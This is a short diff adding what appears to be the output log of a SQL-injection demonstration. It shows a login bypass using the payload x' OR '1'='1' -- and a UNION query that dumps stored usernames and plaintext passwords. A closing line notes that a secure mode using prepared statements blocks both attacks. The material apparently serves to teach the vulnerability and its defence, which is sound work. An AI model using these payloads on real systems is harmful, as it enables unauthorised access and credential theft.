@@ -1,0 +1,5 @@
+== 1. auth bypass: login with  x' OR '1'='1' --
+{"ok":true,"csrf":"1be50e98ca41732a884a7f779076d5b3","username":"alice"}
+== 2. dump all credentials via UNION in search
+[{"id":1,"title":"alice","body":"alicepass"},{"id":2,"title":"bob","body":"bobsecret"}]
+(SECURE mode returns bad credentials / [] — prepared statements neutralise both)
